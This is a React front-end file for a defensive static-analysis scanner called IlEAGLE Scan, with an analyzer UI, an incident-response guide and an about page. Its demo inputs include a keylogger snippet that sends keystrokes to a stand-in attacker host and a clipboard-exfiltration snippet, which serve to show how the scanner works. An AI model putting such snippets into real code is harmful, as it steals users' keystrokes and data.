import React, { useEffect, useRef, useState } from "react";
import { createRoot } from "react-dom/client";
import "./styles.css";

const API_URL = "http://localhost:5000";

function Icon({ name, size = 22 }) {
  const icons = {
    shield: (
      <svg width={size} height={size} viewBox="0 0 24 24" fill="none">
        <path
          d="M12 3L20 6V11C20 16.5 16.5 20 12 21C7.5 20 4 16.5 4 11V6L12 3Z"
          stroke="currentColor"
          strokeWidth="1.8"
        />
        <path
          d="M9 12L11 14L15 10"
          stroke="currentColor"
          strokeWidth="1.8"
          strokeLinecap="round"
          strokeLinejoin="round"
        />
      </svg>
    ),

    search: (
      <svg width={size} height={size} viewBox="0 0 24 24" fill="none">
        <circle cx="11" cy="11" r="7" stroke="currentColor" strokeWidth="1.8" />
        <path d="M16.5 16.5L21 21" stroke="currentColor" strokeWidth="1.8" />
      </svg>
    ),

    alert: (
      <svg width={size} height={size} viewBox="0 0 24 24" fill="none">
        <path
          d="M12 3L22 20H2L12 3Z"
          stroke="currentColor"
          strokeWidth="1.8"
          strokeLinejoin="round"
        />
        <path d="M12 9V14" stroke="currentColor" strokeWidth="1.8" />
        <circle cx="12" cy="17" r="1" fill="currentColor" />
      </svg>
    ),

    info: (
      <svg width={size} height={size} viewBox="0 0 24 24" fill="none">
        <circle cx="12" cy="12" r="9" stroke="currentColor" strokeWidth="1.8" />
        <path d="M12 11V17" stroke="currentColor" strokeWidth="1.8" />
        <circle cx="12" cy="7.5" r="1" fill="currentColor" />
      </svg>
    ),

    wifi: (
      <svg width={size} height={size} viewBox="0 0 24 24" fill="none">
        <path
          d="M3 8C8.5 3.5 15.5 3.5 21 8"
          stroke="currentColor"
          strokeWidth="1.8"
          strokeLinecap="round"
        />
        <path
          d="M6 12C9.5 9 14.5 9 18 12"
          stroke="currentColor"
          strokeWidth="1.8"
          strokeLinecap="round"
        />
        <path
          d="M9.5 15.5C11 14.3 13 14.3 14.5 15.5"
          stroke="currentColor"
          strokeWidth="1.8"
          strokeLinecap="round"
        />
        <circle cx="12" cy="19" r="1" fill="currentColor" />
      </svg>
    ),

    lock: (
      <svg width={size} height={size} viewBox="0 0 24 24" fill="none">
        <rect
          x="5"
          y="10"
          width="14"
          height="10"
          rx="2"
          stroke="currentColor"
          strokeWidth="1.8"
        />
        <path
          d="M8 10V7C8 4.8 9.8 3 12 3C14.2 3 16 4.8 16 7V10"
          stroke="currentColor"
          strokeWidth="1.8"
        />
      </svg>
    ),

    file: (
      <svg width={size} height={size} viewBox="0 0 24 24" fill="none">
        <path
          d="M6 3H14L19 8V21H6V3Z"
          stroke="currentColor"
          strokeWidth="1.8"
        />
        <path d="M14 3V8H19" stroke="currentColor" strokeWidth="1.8" />
        <path d="M9 13H16M9 17H16" stroke="currentColor" strokeWidth="1.8" />
      </svg>
    ),

    scan: (
      <svg width={size} height={size} viewBox="0 0 24 24" fill="none">
        <path d="M4 8V5C4 4.4 4.4 4 5 4H8" stroke="currentColor" strokeWidth="1.8" />
        <path d="M16 4H19C19.6 4 20 4.4 20 5V8" stroke="currentColor" strokeWidth="1.8" />
        <path d="M20 16V19C20 19.6 19.6 20 19 20H16" stroke="currentColor" strokeWidth="1.8" />
        <path d="M8 20H5C4.4 20 4 19.6 4 19V16" stroke="currentColor" strokeWidth="1.8" />
        <path d="M7 12H17" stroke="currentColor" strokeWidth="1.8" />
      </svg>
    ),

    server: (
      <svg width={size} height={size} viewBox="0 0 24 24" fill="none">
        <rect x="4" y="4" width="16" height="6" rx="1" stroke="currentColor" strokeWidth="1.8" />
        <rect x="4" y="14" width="16" height="6" rx="1" stroke="currentColor" strokeWidth="1.8" />
        <circle cx="8" cy="7" r="1" fill="currentColor" />
        <circle cx="8" cy="17" r="1" fill="currentColor" />
      </svg>
    ),

    key: (
      <svg width={size} height={size} viewBox="0 0 24 24" fill="none">
        <circle cx="8" cy="15" r="4" stroke="currentColor" strokeWidth="1.8" />
        <path
          d="M11 12L20 3M16 7L19 10M14 9L17 12"
          stroke="currentColor"
          strokeWidth="1.8"
          strokeLinecap="round"
        />
      </svg>
    ),

    eye: (
      <svg width={size} height={size} viewBox="0 0 24 24" fill="none">
        <path
          d="M2.5 12C5 7.5 8.2 5 12 5C15.8 5 19 7.5 21.5 12C19 16.5 15.8 19 12 19C8.2 19 5 16.5 2.5 12Z"
          stroke="currentColor"
          strokeWidth="1.8"
        />
        <circle cx="12" cy="12" r="3" stroke="currentColor" strokeWidth="1.8" />
      </svg>
    ),

    refresh: (
      <svg width={size} height={size} viewBox="0 0 24 24" fill="none">
        <path
          d="M20 11A8 8 0 0 0 6 6L4 8"
          stroke="currentColor"
          strokeWidth="1.8"
        />
        <path d="M4 4V8H8" stroke="currentColor" strokeWidth="1.8" />
        <path
          d="M4 13A8 8 0 0 0 18 18L20 16"
          stroke="currentColor"
          strokeWidth="1.8"
        />
        <path d="M20 20V16H16" stroke="currentColor" strokeWidth="1.8" />
      </svg>
    ),

    database: (
      <svg width={size} height={size} viewBox="0 0 24 24" fill="none">
        <ellipse cx="12" cy="5" rx="7" ry="3" stroke="currentColor" strokeWidth="1.8" />
        <path d="M5 5V12C5 13.7 8.1 15 12 15C15.9 15 19 13.7 19 12V5" stroke="currentColor" strokeWidth="1.8" />
        <path d="M5 12V19C5 20.7 8.1 22 12 22C15.9 22 19 20.7 19 19V12" stroke="currentColor" strokeWidth="1.8" />
      </svg>
    ),

    globe: (
      <svg width={size} height={size} viewBox="0 0 24 24" fill="none">
        <circle cx="12" cy="12" r="9" stroke="currentColor" strokeWidth="1.8" />
        <path d="M3 12H21M12 3C14.5 5.5 15.5 8.5 15.5 12C15.5 15.5 14.5 18.5 12 21M12 3C9.5 5.5 8.5 8.5 8.5 12C8.5 15.5 9.5 18.5 12 21" stroke="currentColor" strokeWidth="1.5" />
      </svg>
    )
  };

  return icons[name] || icons.info;
}

function IntroScreen({ onComplete }) {
  const videoRef = useRef(null);
  const completedRef = useRef(false);
  const [videoReady, setVideoReady] = useState(false);
  const [videoSrc, setVideoSrc] = useState("/assets/intro-desktop.mp4");

  const completeIntro = () => {
    if (completedRef.current) {
      return;
    }
    completedRef.current = true;
    onComplete();
  };

  useEffect(() => {
    const mediaQuery = window.matchMedia("(max-width: 800px)");

    const pickSource = () => {
      setVideoSrc(
        mediaQuery.matches
          ? "/assets/intro-mobile.mp4"
          : "/assets/intro-desktop.mp4"
      );
    };

    pickSource();

    if (typeof mediaQuery.addEventListener === "function") {
      mediaQuery.addEventListener("change", pickSource);
      return () => mediaQuery.removeEventListener("change", pickSource);
    }

    mediaQuery.addListener(pickSource);
    return () => mediaQuery.removeListener(pickSource);
  }, []);

  useEffect(() => {
    const video = videoRef.current;

    if (!video) {
      return;
    }

    completedRef.current = false;
    setVideoReady(false);

    video.muted = true;
    video.defaultMuted = true;
    video.playsInline = true;

    const tryPlay = () => {
      const playPromise = video.play();
      if (playPromise && typeof playPromise.catch === "function") {
        playPromise.catch(() => {
          // Retry via listeners/timer if the browser temporarily blocks autoplay.
        });
      }
    };

    const markReady = () => setVideoReady(true);
    const onCanPlay = () => {
      markReady();
      tryPlay();
    };

    const onVisibility = () => {
      if (!document.hidden) {
        tryPlay();
      }
    };

    const onInteraction = () => {
      tryPlay();
    };

    video.addEventListener("loadeddata", markReady);
    video.addEventListener("canplay", onCanPlay);
    document.addEventListener("visibilitychange", onVisibility);
    window.addEventListener("pointerdown", onInteraction, { once: true });
    window.addEventListener("keydown", onInteraction, { once: true });

    video.load();

    let attempts = 0;
    const retryTimer = window.setInterval(() => {
      attempts += 1;
      tryPlay();
      if (!video.paused || attempts >= 16) {
        window.clearInterval(retryTimer);
      }
    }, 250);

    const fallbackTimer = window.setTimeout(() => {
      completeIntro();
    }, 13000);

    tryPlay();

    return () => {
      window.clearInterval(retryTimer);
      window.clearTimeout(fallbackTimer);
      video.removeEventListener("loadeddata", markReady);
      video.removeEventListener("canplay", onCanPlay);
      document.removeEventListener("visibilitychange", onVisibility);
      window.removeEventListener("pointerdown", onInteraction);
      window.removeEventListener("keydown", onInteraction);
    };
  }, [videoSrc]);

  return (
    <div className="intro-screen">
      <video
        ref={videoRef}
        className="intro-video"
        src={videoSrc}
        autoPlay
        muted
        playsInline
        preload="auto"
        onEnded={completeIntro}
      />

      {!videoReady && (
        <div className="intro-loading">
          INITIALIZING SECURITY SYSTEM...
        </div>
      )}
    </div>
  );
}

const emergencySteps = [
  {
    number: "01",
    icon: "wifi",
    title: "Contain",
    text: "Disconnect the affected device from the network.",
    bullets: [
      "Turn off Wi-Fi on the device.",
      "Unplug the Ethernet cable.",
      "Disconnect VPNs, tethering and unknown external network connections."
    ],
    note: "This may help stop ongoing communication. It does not remove malware that is already present."
  },
  {
    number: "02",
    icon: "lock",
    title: "Isolate",
    text: "Stop using the device for anything sensitive.",
    bullets: [
      "Do not enter passwords on it.",
      "Do not open banking, email or password managers.",
      "Move sensitive work to a separate, trusted device."
    ],
    note: "Assume anything typed on a compromised device can be observed."
  },
  {
    number: "03",
    icon: "file",
    title: "Preserve Evidence",
    text: "If the incident looks significant, capture context before cleaning up.",
    bullets: [
      "Note timestamps and what you observed.",
      "Record suspicious messages, files, domains and account activity.",
      "Preserve relevant application, system and network logs.",
      "List the systems and accounts that may be involved."
    ],
    note: "Premature cleanup can destroy the evidence a professional responder would need."
  },
  {
    number: "04",
    icon: "scan",
    title: "Scan",
    text: "Use trusted, updated security software.",
    bullets: [
      "Update signatures, then run a full or offline deep scan.",
      "Prefer the vendor tooling your organisation already approves.",
      "Never open or run the suspicious file to 'see what it does'."
    ],
    note: "A clean scan result is reassuring, but it is not proof that a system is unaffected."
  },
  {
    number: "05",
    icon: "key",
    title: "Recover Accounts",
    text: "Work only from a known-clean device.",
    bullets: [
      "Change your email password first — it controls most resets.",
      "Then financial, cloud, developer and social accounts.",
      "Enable multi-factor authentication wherever it is missing.",
      "Revoke active sessions, app passwords and API tokens."
    ],
    note: "Changing passwords from the compromised device can hand the new password straight to the attacker."
  },
  {
    number: "06",
    icon: "server",
    title: "Check for Persistence",
    text: "Look for mechanisms that would bring the activity back.",
    bullets: [
      "Startup applications and login items.",
      "Scheduled tasks and cron entries.",
      "Browser extensions and profile changes.",
      "Recently installed applications, services and unfamiliar login sessions."
    ],
    note: "If you are unsure whether something is legitimate, document it and ask before deleting it."
  },
  {
    number: "07",
    icon: "alert",
    title: "Report and Escalate",
    text: "Involve the people who can act on it.",
    bullets: [
      "Your organisation's security team or IT administrator.",
      "The affected service provider's support or abuse channel.",
      "Your bank or financial institution if payment credentials were exposed.",
      "The appropriate cybercrime reporting authority in your country."
    ],
    note: "Escalate early when personal data, customer data or money is involved."
  }
];

function Header({ page, setPage, theme, setTheme }) {
  const [menuOpen, setMenuOpen] = useState(false);

  const navigate = (target) => {
    setPage(target);
    setMenuOpen(false);
    window.scrollTo({ top: 0, behavior: "smooth" });
  };

  return (
    <header className="site-header">
      <div className="header-inner">

        <button className="brand" onClick={() => navigate("analyzer")}>
          <div className="brand-logo">
            <img src="/assets/eagle-logo.png" alt="IlEAGLE Scan" />
          </div>
          <div className="brand-name">
            IlEAGLE <strong>Scan</strong>
          </div>
        </button>

        <nav className={`main-nav ${menuOpen ? "open" : ""}`}>
          <button
            className={page === "analyzer" ? "active" : ""}
            onClick={() => navigate("analyzer")}
          >
            Analyzer
          </button>

          <button
            className={page === "emergency" ? "active" : ""}
            onClick={() => navigate("emergency")}
          >
            Emergency Guide
          </button>

          <button
            className={page === "about" ? "active" : ""}
            onClick={() => navigate("about")}
          >
            About
          </button>

          <button
            className="emergency-nav"
            onClick={() => navigate("emergency")}
          >
            <Icon name="alert" size={17} />
            Active Breach?
          </button>
        </nav>

        <div className="header-actions">
          <button
            className="theme-toggle"
            onClick={() => setTheme(theme === "dark" ? "light" : "dark")}
            aria-label="Toggle theme"
          >
            {theme === "dark" ? "☀" : "☾"}
          </button>

          <button
            className="mobile-menu"
            onClick={() => setMenuOpen(!menuOpen)}
            aria-label="Menu"
          >
            <span></span>
            <span></span>
            <span></span>
          </button>
        </div>

      </div>
    </header>
  );
}

function Analyzer() {
  const [input, setInput] = useState("");
  const [loading, setLoading] = useState(false);
  const [result, setResult] = useState(null);
  const [scanError, setScanError] = useState("");

  const scan = async () => {
    if (!input.trim()) return;

    setLoading(true);
    setResult(null);
    setScanError("");

    try {
      const response = await fetch(`${API_URL}/api/scan`, {
        method: "POST",
        headers: {
          "Content-Type": "application/json"
        },
        body: JSON.stringify({
          input,
          type: "auto"
        })
      });

      const data = await response.json();

      if (!response.ok || !data.success) {
        throw new Error(data.error || "The scanner could not analyze this input.");
      }

      setResult(data.report || null);
    } catch (error) {
      setScanError(
        error instanceof Error
          ? error.message
          : "Unable to connect to the IlEAGLE analysis server. Make sure the backend is running on port 5000."
      );
    } finally {
      setLoading(false);
    }
  };

  const clear = () => {
    setInput("");
    setResult(null);
    setScanError("");
  };

  const loadExample = (type) => {
    const examples = {
      safe: `function greetUser(name) {
  return "Hello " + name;
}`,

      suspicious: `const data = navigator.clipboard.readText();
fetch("https://example.com/upload", {
  method: "POST",
  body: data
});`,

      dangerous: `document.addEventListener("keydown", e => {
  fetch("https://attacker.example/keylog", {
    method: "POST",
    body: e.key
  });
});`
    };

    setInput(examples[type]);
  };

  const verdictClass =
    result?.verdict?.toLowerCase() === "dangerous"
      ? "dangerous"
      : result?.verdict?.toLowerCase() === "suspicious"
      ? "suspicious"
      : result?.verdict?.toLowerCase() === "safe"
      ? "safe"
      : "error";

  return (
    <main className="page analyzer-page">

      <section className="hero-section">
        <div className="hero-grid">

          <div className="hero-copy">
            <div className="eyebrow">
              <span className="status-dot"></span>
              SECURITY ANALYZER
            </div>

            <h1>
              Analyze suspicious content with
              <span> IlEAGLE precision.</span>
            </h1>

            <p className="hero-description">
              Static analysis for suspicious URLs, scripts, code snippets and
              text logs — without executing submitted code.
            </p>

            <div className="hero-stats">
              <div>
                <strong>32</strong>
                <span>Heuristics</span>
              </div>

              <div>
                <strong>20K</strong>
                <span>Max characters</span>
              </div>

              <div>
                <strong>0</strong>
                <span>Code execution</span>
              </div>
            </div>
          </div>

          <div className="hero-visual">
            <div className="eagle-card">
              <div className="scan-line"></div>
              <img src="/assets/eagle-logo.png" alt="IlEAGLE security eagle" />
              <div className="eagle-card-footer">
                <span>IL EAGLE SECURITY CORE</span>
                <span className="online">
                  <i></i> ONLINE
                </span>
              </div>
            </div>
          </div>

        </div>
      </section>

      <section className="analyzer-section">

        <div className="section-label">
          <Icon name="scan" size={18} />
          ANALYSIS ENGINE
        </div>

        <div className="workspace-card">

          <div className="workspace-header">
            <div>
              <div className="mini-label">INPUT ANALYSIS</div>
              <h2>Scan suspicious content</h2>
              <p>
                Paste a URL, code snippet, script or text log below.
              </p>
            </div>

            <div className="scan-mode-pill">AUTO DETECT</div>
          </div>

          <textarea
            value={input}
            onChange={(e) => setInput(e.target.value)}
            maxLength={20000}
            placeholder="Paste your suspicious URL, code snippet, script or text log here..."
          />

          <div className="input-footer">
            <span>{input.length.toLocaleString()} / 20,000 characters</span>

            <div className="input-actions">
              <button className="secondary-btn" onClick={clear}>
                Clear
              </button>

              <button
                className="primary-btn"
                onClick={scan}
                disabled={!input.trim() || loading}
              >
                <Icon name="search" size={18} />
                {loading ? "Analyzing..." : "Run IlEAGLE Scan"}
              </button>
            </div>
          </div>

          <div className="examples">
            <span>DEMO INPUTS</span>

            <button onClick={() => loadExample("safe")}>
              Safe example
            </button>

            <button onClick={() => loadExample("suspicious")}>
              Suspicious example
            </button>

            <button onClick={() => loadExample("dangerous")}>
              High-risk simulation
            </button>
          </div>

        </div>

        {loading && (
          <div className="analysis-loading">
            <div className="loading-spinner"></div>
            <div>
              <strong>IlEAGLE is analyzing...</strong>
              <span>Matching deterministic security heuristics.</span>
            </div>
          </div>
        )}

        {scanError && !loading && (
          <div className="scan-error">
            <strong>Scan failed.</strong> {scanError}
          </div>
        )}

        {result && !loading && (
          <ResultPanel result={result} verdictClass={verdictClass} />
        )}

      </section>

      <section className="security-principles">
        <div>
          <span className="principle-icon">
            <Icon name="shield" />
          </span>
          <strong>Static only</strong>
          <p>Submitted code is never executed.</p>
        </div>

        <div>
          <span className="principle-icon">
            <Icon name="database" />
          </span>
          <strong>Deterministic engine</strong>
          <p>Pattern-based security heuristics.</p>
        </div>

        <div>
          <span className="principle-icon">
            <Icon name="eye" />
          </span>
          <strong>Transparent results</strong>
          <p>Understand why a verdict was given.</p>
        </div>
      </section>

    </main>
  );
}

function ResultPanel({ result, verdictClass }) {
  return (
    <section className="results-section">

      <div className={`verdict-card ${verdictClass}`}>
        <div className="verdict-icon">
          <Icon
            name={
              verdictClass === "dangerous"
                ? "alert"
                : verdictClass === "suspicious"
                ? "eye"
                : "shield"
            }
            size={28}
          />
        </div>

        <div className="verdict-main">
          <span>IL EAGLE VERDICT</span>
          <strong>{result.verdict || "UNKNOWN"}</strong>
        </div>

        <div className="score">
          <span>RISK SCORE</span>
          <strong>{result.score ?? 0}</strong>
          <small>/ 100</small>
        </div>
      </div>

      <div className="result-grid">

        <div className="result-card">
          <div className="result-card-title">
            <Icon name="search" />
            <div>
              <span>01</span>
              <h3>Detected Indicators</h3>
            </div>
          </div>

          {result.indicators?.length ? (
            <div className="indicator-list">
              {result.indicators.map((item, index) => (
                <div className="indicator" key={index}>
                  <span>{item.label || item.name || item.id || String(item)}</span>
                  {item.severity && (
                    <small>{item.severity}</small>
                  )}
                </div>
              ))}
            </div>
          ) : (
            <p className="empty-result">
              No suspicious indicators were detected.
            </p>
          )}
        </div>

        <div className="result-card">
          <div className="result-card-title">
            <Icon name="eye" />
            <div>
              <span>02</span>
              <h3>X-Ray Translation</h3>
            </div>
          </div>

          <ul className="xray-list">
            {(result.xray || []).map((item, index) => (
              <li key={index}>
                {typeof item === "string"
                  ? item
                  : `${item.pattern}: ${item.meaning}`}
              </li>
            ))}
          </ul>
        </div>

        <div className="result-card impact-card">
          <div className="result-card-title">
            <Icon name="alert" />
            <div>
              <span>03</span>
              <h3>Real-World Impact</h3>
            </div>
          </div>

          {Array.isArray(result.impact) && result.impact.length > 0 ? (
            <ul className="xray-list">
              {result.impact.map((item, index) => (
                <li key={index}>{item}</li>
              ))}
            </ul>
          ) : (
            <p>{result.impact || "No impact information returned."}</p>
          )}
        </div>

        <div className="result-card remediation-card">
          <div className="result-card-title">
            <Icon name="shield" />
            <div>
              <span>04</span>
              <h3>Defensive Remediation</h3>
            </div>
          </div>

          <ol>
            {(result.remediation || []).map((item, index) => (
              <li key={index}>{item}</li>
            ))}
          </ol>
        </div>

      </div>
    </section>
  );
}

function EmergencyGuide() {
  return (
    <main className="page emergency-page">

      <section className="page-hero emergency-hero">
        <div className="eyebrow emergency-eyebrow">
          <Icon name="alert" size={18} />
          INCIDENT RESPONSE
        </div>

        <h1>Active Breach Emergency Guide</h1>

        <p>
          A structured containment and recovery playbook for suspected
          cybersecurity incidents.
        </p>

        <div className="emergency-warning">
          <Icon name="alert" size={20} />
          If you believe a device is actively compromised, begin with Step 1.
        </div>
      </section>

      <section className="emergency-grid">

        {emergencySteps.map((step) => (
          <article className="emergency-card" key={step.number}>

            <div className="emergency-card-top">
              <div className="step-number">{step.number}</div>

              <div className="step-icon">
                <Icon name={step.icon} size={25} />
              </div>
            </div>

            <div className="step-content">
              <div className="step-label">STEP {step.number}</div>

              <h2>{step.title}</h2>

              <p className="step-intro">{step.text}</p>

              <ul>
                {step.bullets.map((bullet, index) => (
                  <li key={index}>{bullet}</li>
                ))}
              </ul>

              <div className="step-note">
                <Icon name="info" size={17} />
                <span>{step.note}</span>
              </div>
            </div>

          </article>
        ))}

      </section>

      <section className="emergency-footer-card">
        <Icon name="shield" size={28} />
        <div>
          <strong>When in doubt, escalate.</strong>
          <p>
            Significant incidents involving personal data, financial accounts,
            customer information or organisational systems should be handled
            with professional incident-response support.
          </p>
        </div>
      </section>

    </main>
  );
}

function About() {
  return (
    <main className="page about-page">

      <section className="page-hero about-hero">
        <div className="about-logo">
          <img src="/assets/eagle-logo.png" alt="IlEAGLE Scan" />
        </div>

        <div>
          <div className="eyebrow">
            <Icon name="info" size={18} />
            ABOUT THE PROJECT
          </div>

          <h1>About IlEAGLE Scan</h1>

          <p>
            Piercing through hidden threats with sharp, eagle-eyed security
            defense and instant recovery.
          </p>
        </div>
      </section>

      <section className="about-content">

        <article className="about-card about-wide">
          <div className="about-card-heading">
            <Icon name="shield" />
            <h2>What is IlEAGLE Scan?</h2>
          </div>

          <p>
            IlEAGLE Scan is a defensive cybersecurity utility. You submit a
            suspicious URL, code snippet, script or text log, and it returns a
            structured security report: a verdict, the indicators behind it,
            a plain-English X-Ray of the behaviour, the real-world impact and
            remediation steps.
          </p>

          <p>
            Analysis is entirely static. Submitted content is treated as
            untrusted text and matched against 32 deterministic heuristics on
            the server.
          </p>

          <div className="static-notice">
            <Icon name="shield" />
            <strong>
              Nothing is evaluated, compiled, imported, fetched or executed.
            </strong>
          </div>
        </article>

        <article className="about-card">
          <div className="about-card-heading">
            <Icon name="scan" />
            <h2>What the verdicts mean</h2>
          </div>

          <div className="verdict-info safe-info">
            <strong>Safe</strong>
            <span>Score 0–19</span>
            <p>No known suspicious patterns were detected by this scanner.</p>
          </div>

          <div className="verdict-info suspicious-info">
            <strong>Suspicious</strong>
            <span>Score 20–49</span>
            <p>Patterns worth a manual review were detected.</p>
          </div>

          <div className="verdict-info dangerous-info">
            <strong>Dangerous</strong>
            <span>Score 50–100</span>
            <p>High-risk indicators were detected.</p>
          </div>
        </article>

        <article className="about-card">
          <div className="about-card-heading">
            <Icon name="database" />
            <h2>Severity & Scoring</h2>
          </div>

          <p>
            Severity weights are:
          </p>

          <div className="severity-list">
            <span>Low <b>5</b></span>
            <span>Medium <b>15</b></span>
            <span>High <b>25</b></span>
            <span>Critical <b>40</b></span>
          </div>

          <p>
            Correlated behaviour raises the score further. Data collection
            combined with an outbound request is treated as far more serious
            than either alone.
          </p>

          <p>
            A single common API such as <code>fetch()</code> is capped so
            ordinary code is not labelled dangerous.
          </p>
        </article>

        <article className="about-card about-wide">
          <div className="about-card-heading">
            <Icon name="eye" />
            <h2>Detection Categories</h2>
          </div>

          <div className="category-grid">
            {[
              "Keylogging",
              "Clipboard monitoring",
              "Credential access",
              "Browser manipulation",
              "Data exfiltration",
              "Obfuscation",
              "Shell execution",
              "Remote control",
              "Persistence",
              "File manipulation",
              "Network indicator",
              "URL indicator"
            ].map((category) => (
              <div key={category}>
                <span></span>
                {category}
              </div>
            ))}
          </div>
        </article>

        <article className="about-card limitations-card about-wide">
          <div className="about-card-heading">
            <Icon name="alert" />
            <h2>Limitations</h2>
          </div>

          <ul>
            <li>
              Heuristics detect patterns, not intent. Legitimate software can
              match several of these rules.
            </li>
            <li>
              A “Safe” verdict is not a guarantee. Novel or well-hidden
              techniques can pass unnoticed.
            </li>
            <li>
              This is not a replacement for endpoint protection, code review
              or professional incident response.
            </li>
            <li>
              Inputs are analyzed up to 20,000 characters; longer submissions
              are truncated.
            </li>
          </ul>
        </article>

      </section>

    </main>
  );
}

function Footer({ setPage }) {
  return (
    <footer className="site-footer">

      <div className="footer-brand">
        <img src="/assets/eagle-logo.png" alt="" />
        <div>
          <strong>IlEAGLE Scan</strong>
          <span>Defensive cybersecurity analysis.</span>
        </div>
      </div>

      <div className="footer-links">
        <button onClick={() => setPage("analyzer")}>Analyzer</button>
        <button onClick={() => setPage("emergency")}>Emergency Guide</button>
        <button onClick={() => setPage("about")}>About</button>
      </div>

      <div className="footer-bottom">
        <span>© 2026 IlEAGLE Scan</span>
        <span>Defensive heuristic static analysis</span>
        <span>Never executes submitted content</span>
      </div>

    </footer>
  );
}

function App() {
  const [intro, setIntro] = useState(true);
  const [introExiting, setIntroExiting] = useState(false);
  const [page, setPage] = useState("analyzer");
  const [theme, setTheme] = useState(
    localStorage.getItem("ileagle-theme") || "dark"
  );

  const shouldReplayIntro = window.location.hash === "#replay-intro";

  useEffect(() => {
    const hasSeenIntro = localStorage.getItem("ileagle-intro-seen") === "true";

    setIntro(shouldReplayIntro || !hasSeenIntro);

    if (shouldReplayIntro) {
      window.history.replaceState(null, "", window.location.pathname);
    }
  }, [shouldReplayIntro]);

  useEffect(() => {
    document.documentElement.setAttribute("data-theme", theme);
    localStorage.setItem("ileagle-theme", theme);
  }, [theme]);

  useEffect(() => {
    const handleHash = () => {
      const hash = window.location.hash.replace("#", "");

      if (hash === "replay-intro") {
        setIntro(true);
        setIntroExiting(false);
        window.history.replaceState(null, "", window.location.pathname);
        return;
      }

      if (hash === "emergency") setPage("emergency");
      else if (hash === "about") setPage("about");
      else setPage("analyzer");
    };

    handleHash();
    window.addEventListener("hashchange", handleHash);

    return () => window.removeEventListener("hashchange", handleHash);
  }, []);

  const changePage = (target) => {
    setPage(target);

    const hash = target === "analyzer" ? "" : `#${target}`;
    window.history.replaceState(
      null,
      "",
      `${window.location.pathname}${hash}`
    );

    window.scrollTo({ top: 0, behavior: "smooth" });
  };

  const finishIntro = () => {
    setIntroExiting(true);
    localStorage.setItem("ileagle-intro-seen", "true");

    setTimeout(() => {
      setIntro(false);
      setIntroExiting(false);
    }, 420);
  };

  useEffect(() => {
    if (!intro) {
      return;
    }

    const onKeyDown = (event) => {
      if (event.key === "Escape") {
        finishIntro();
      }
    };

    window.addEventListener("keydown", onKeyDown);

    return () => window.removeEventListener("keydown", onKeyDown);
  }, [intro]);

  if (intro) {
    return (
      <div className={introExiting ? "intro-exit" : ""}>
        <IntroScreen onComplete={finishIntro} />
      </div>
    );
  }

  return (
    <div className="app">

      <Header
        page={page}
        setPage={changePage}
        theme={theme}
        setTheme={setTheme}
      />

      {page === "analyzer" && <Analyzer />}
      {page === "emergency" && <EmergencyGuide />}
      {page === "about" && <About />}

      <Footer setPage={changePage} />

    </div>
  );
}

createRoot(document.getElementById("root")).render(<App />);

